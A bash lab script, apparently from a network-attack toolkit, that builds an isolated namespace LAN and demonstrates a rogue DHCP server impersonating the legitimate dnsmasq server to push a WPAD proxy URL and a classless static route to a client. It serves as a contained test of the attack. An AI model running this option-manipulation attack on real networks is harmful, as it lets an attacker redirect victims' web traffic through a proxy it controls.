#!/usr/bin/env bash
# Isolated DHCP option manipulation lab (Linux only, needs root).
#
# Topology: one bridge (the LAN) with three hosts attached:
#
#   server:   dnsmasq, the legitimate DHCP server (10.99.0.1, pool 10.99.0.100-119).
#             It sends no proxy (WPAD, option 252) configuration.
#   attacker: MACabre's option manipulation. It answers in the server's name with a WPAD
#             URL (option 252) and a static route (option 121).
#   client:   a DHCP client. It runs a discover and a request, and prints the options the
#             server sent with its acknowledgment.
#
#   Phase 1 (baseline): the legitimate server runs. The client receives no WPAD option.
#   Phase 2 (attack): the legitimate server is stopped and the attacker runs. The client
#                     receives the WPAD option the attacker chose.
#
# Nothing here touches the host's real network interfaces.
#
# Usage:
#   sudo scripts/lab/dhcp_option_manipulation_lab.sh
#
# Requirements: iproute2, dnsmasq, and the project virtualenv (.venv).
# Override the interpreter with PYTHON=/path/to/python.

set -euo pipefail

if [[ "$(id -u)" -ne 0 ]]; then
    echo "This lab needs root: run it with sudo." >&2
    exit 1
fi

for tool in ip dnsmasq; do
    if ! command -v "$tool" >/dev/null 2>&1; then
        echo "Missing required tool: $tool" >&2
        exit 1
    fi
done

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
PY="${PYTHON:-$ROOT/.venv/bin/python}"
CLIENT_MAC="02:00:00:00:00:50"
SERVER_IP="10.99.0.1"
WPAD_URL="http://10.99.0.5/wpad.dat"
ATTACK_SECONDS=20
WORK="$(mktemp -d)"

stop_lab() {
    for pid in $(ip netns pids server 2>/dev/null || true); do
        kill "$pid" 2>/dev/null || true
    done
    for ns in server client attacker lan; do
        ip netns del "$ns" 2>/dev/null || true
    done
}
cleanup() {
    stop_lab
    rm -rf "$WORK"
}
trap cleanup EXIT

stop_lab

ip netns add lan
ip netns add server
ip netns add client
ip netns add attacker

for pair in "srv:server" "cli:client" "att:attacker"; do
    name="${pair%%:*}"
    ns="${pair##*:}"
    ip link add "p-$name" type veth peer name "h-$name"
    ip link set "h-$name" netns "$ns"
    ip link set "p-$name" netns lan
done

ip netns exec lan ip link add br0 type bridge
ip netns exec lan ip link set br0 up
for name in srv cli att; do
    ip netns exec lan ip link set "p-$name" master br0
    ip netns exec lan ip link set "p-$name" up
done

ip netns exec server ip link set lo up
ip netns exec server ip addr add "$SERVER_IP/24" dev h-srv
ip netns exec server ip link set h-srv up
ip netns exec client ip link set h-cli address "$CLIENT_MAC"
ip netns exec client ip link set h-cli up
ip netns exec attacker ip link set h-att up

LEGIT_MAC="$(ip netns exec server ip -o link show h-srv | grep -o 'link/ether [0-9a-f:]*' | awk '{print $2}')"

start_server() {
    ip netns exec server dnsmasq \
        --keep-in-foreground \
        --interface=h-srv \
        --bind-interfaces \
        --port=0 \
        --conf-file=/dev/null \
        --dhcp-authoritative \
        --no-ping \
        --dhcp-range=10.99.0.100,10.99.0.119,12h \
        --dhcp-leasefile="$WORK/leases" &
    sleep 2
}

# The client runs a discover and a request, and prints the WPAD URL it received, or "none".
CLIENT_CODE='
import os, random, time
from scapy.all import AsyncSniffer, sendp, BOOTP, DHCP
from macabre.attacks.dhcp_starvation import build_discover, build_request

MAC = os.environ["CLIENT_MAC"]
rng = random.Random()
seen = []

def on_packet(pkt):
    if pkt.haslayer(DHCP) and pkt.haslayer(BOOTP) and pkt[BOOTP].op == 2:
        seen.append(pkt)

def options(pkt):
    return {o[0]: o[1] for o in pkt[DHCP].options if isinstance(o, tuple)}

sniffer = AsyncSniffer(iface="h-cli", store=False, prn=on_packet)
sniffer.start()
time.sleep(0.5)
xid = rng.getrandbits(32)
sendp(build_discover(MAC, xid), iface="h-cli", verbose=False)
time.sleep(1.5)
offers = [p for p in seen if p[BOOTP].xid == xid and options(p).get("message-type") == 2]
if not offers:
    print("none")
    raise SystemExit(0)
offer = offers[0]
sendp(build_request(MAC, xid, offer[BOOTP].yiaddr, options(offer).get("server_id")), iface="h-cli", verbose=False)
time.sleep(1.5)
sniffer.stop()
acks = [p for p in seen if p[BOOTP].xid == xid and options(p).get("message-type") == 5]
if not acks:
    print("none")
    raise SystemExit(0)
wpad = options(acks[0]).get(252)
print(wpad.decode() if isinstance(wpad, bytes) else "none")
'

ask_client() {
    ip netns exec client env PYTHONPATH="$ROOT/src" CLIENT_MAC="$CLIENT_MAC" "$PY" -c "$CLIENT_CODE" 2>/dev/null | tail -1
}

ATTACK_CODE='
import os, threading
from macabre.attacks.dhcp_option_manipulation import DhcpOptionManipulationConfig, run_dhcp_option_manipulation
stop = threading.Event()
threading.Timer(float(os.environ["ATTACK_SECONDS"]), stop.set).start()
stats = run_dhcp_option_manipulation(
    DhcpOptionManipulationConfig(
        iface="h-att",
        server_ip="10.99.0.1",
        server_mac=os.environ["LEGIT_MAC"],
        offer_ip="10.99.0.150",
        classless_routes="198.51.100.0/24=10.99.0.254",
        wpad_url=os.environ["WPAD_URL"],
    ),
    stop,
    lambda _: None,
)
print(f"Attacker: answered {stats.offers} discovers and {stats.acks} requests")
'

echo "Phase 1: baseline, legitimate server only"
start_server
BASE="$(ask_client)"
echo "  WPAD URL the client received: $BASE"
echo

echo "Phase 2: legitimate server stopped, attacker answers for ${ATTACK_SECONDS}s"
for pid in $(ip netns pids server 2>/dev/null || true); do
    kill "$pid" 2>/dev/null || true
done
sleep 2
ip netns exec attacker env PYTHONPATH="$ROOT/src" ATTACK_SECONDS="$ATTACK_SECONDS" LEGIT_MAC="$LEGIT_MAC" \
    WPAD_URL="$WPAD_URL" "$PY" -c "$ATTACK_CODE" &
ATTACK_PID=$!
sleep 2
ATTACKED="$(ask_client)"
echo "  WPAD URL the client received: $ATTACKED"
wait "$ATTACK_PID"
echo

if [[ "$BASE" == "none" && "$ATTACKED" == "$WPAD_URL" ]]; then
    echo "Result: with the legitimate server alone, the client got no WPAD option. With the attacker answering, it received the WPAD URL $WPAD_URL. Whether a client applies a received option depends on the client; the lab only records what the client receives."
else
    echo "Result: the outcome did not match the expected phases. Result unreliable."
    exit 1
fi
